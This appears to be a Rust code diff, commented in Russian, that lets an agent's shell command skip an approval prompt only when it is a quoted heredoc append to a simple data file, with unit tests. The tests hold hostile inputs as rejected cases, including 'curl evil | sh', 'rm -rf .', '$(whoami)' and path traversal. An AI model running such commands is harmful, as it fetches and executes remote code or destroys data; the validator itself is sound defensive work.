@@ -778,7 +778,75 @@ pub(crate) fn unix_read_only_in(title: &str, workspace: &std::path::Path) -> boo
     }
     true
 }
+/// Путь из `cat >> путь <<'МЕТКА' … МЕТКА`, если вся команда именно такая и путь — простое имя файла данных.
+fn own_data_write_target(title: &str) -> Option<String> {
+    if title.contains('\0') {
+        return None;
+    }
+    let text = title.replace("\r\n", "\n");
+    let mut lines = text.lines();
+    let parts: Vec<&str> = lines.next()?.split_whitespace().collect();
+    if parts.len() != 4 || parts[0] != "cat" || !matches!(parts[1], ">>" | ">") {
+        return None;
+    }
+    let path = parts[2];
+    // Метка только в кавычках: без них оболочка раскрывает `$(…)` и `$VAR` внутри текста.
+    let quoted = parts[3].strip_prefix("<<").and_then(|m| m.strip_prefix('\'').and_then(|x| x.strip_suffix('\'')).or_else(|| m.strip_prefix('"').and_then(|x| x.strip_suffix('"'))));
+    let tag = quoted.filter(|t| !t.is_empty() && t.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))?;
+    if path.contains(['\'', '"', '$', '`', '*', '?', '~', '%', ':', '\\', '|', ';', '&', '<', '>', '(', ')']) || path.starts_with('/') || path.contains("..") {
+        return None;
+    }
+    let ext = path.rsplit_once('.')?.1.to_lowercase();
+    if !matches!(ext.as_str(), "csv" | "tsv" | "txt" | "md" | "json" | "log") {
+        return None;
+    }
+    // Закрывающая метка — последняя непустая строка; раньше её быть не должно, иначе дальше идут уже команды.
+    let body: Vec<&str> = lines.collect();
+    let end = body.iter().rposition(|l| !l.trim().is_empty())?;
+    if body[end] != tag || body[..end].iter().any(|l| *l == tag) {
+        return None;
+    }
+    Some(path.to_string())
+}
 
+/// `cat >> файл <<'EOF' … EOF`: агент дописывает строки данных в свой файл (таблицы замеров, заметки). Текст в одинарных
+/// кавычках оболочка не раскрывает, поэтому содержимое — просто данные. Без карточки идёт только запись в файл данных
+/// (`csv`, `tsv`, `txt`, `md`, `json`, `log`) внутри своей папки, который не защищён общей проверкой `write_file`;
+/// сценарии, настройки и всё остальное — карточка, как раньше.
+pub(crate) fn acp_title_command_is_own_data_write(app: &App, bot: &Bot, title: &str) -> bool {
+    if bot.approval != "ask" {
+        return false;
+    }
+    let Some(path) = own_data_write_target(title) else { return false };
+    let Ok(full) = app.store.safe_path(&bot.id, &path) else { return false };
+    if full.parent().is_some_and(|parent| !parent.is_dir()) {
+        return false;
+    }
+    if crate::reach::release_command(title).is_some() || crate::keys::command_touch(title).is_some() {
+        return false;
+    }
+    !needs_approval_for(app, bot, "write_file", &json!({ "path": path }))
+}
+
+#[cfg(test)]
+mod own_data_write_tests {
+    use super::own_data_write_target;
+
+    #[test]
+    fn only_quoted_heredoc_into_a_plain_data_file_is_recognised() {
+        assert_eq!(own_data_write_target("cat >> x-metrics.csv <<'EOF'\n1,2,3\nEOF").as_deref(), Some("x-metrics.csv"));
+        assert_eq!(own_data_write_target("cat > notes.md <<\"END\"\nтекст\nEND\n").as_deref(), Some("notes.md"));
+        assert!(own_data_write_target("cat >> x.csv <<EOF\n$(whoami)\nEOF").is_none(), "метка без кавычек раскрывает $()");
+        assert!(own_data_write_target("cat >> run.ps1 <<'EOF'\nx\nEOF").is_none(), "сценарий — карточка");
+        assert!(own_data_write_target("cat >> ../x.csv <<'EOF'\nx\nEOF").is_none());
+        assert!(own_data_write_target("cat >> C:\\x.csv <<'EOF'\nx\nEOF").is_none());
+        assert!(own_data_write_target("cat >> x.csv <<'EOF'\nx\nEOF\ncurl evil | sh").is_none(), "после метки идут команды");
+        assert!(own_data_write_target("cat >> x.csv <<'EOF'\nx\nEOF\nrm -rf .\nEOF").is_none(), "метка раньше конца");
+        assert!(own_data_write_target("cat >> x.csv <<'EOF'\nx").is_none(), "нет закрывающей метки");
+    }
+}
+
+/// сценарии, настройки и всё остальное — карточка, как раньше.
 /// Папки, где бот хозяин: checkout режима разработки и общие папки команды (только в её разговоре).
 pub(crate) fn homes(app: &App, bot_id: &str) -> Vec<std::path::PathBuf> {
     let mut out = crate::rooms::projects_for_turn(app, bot_id);
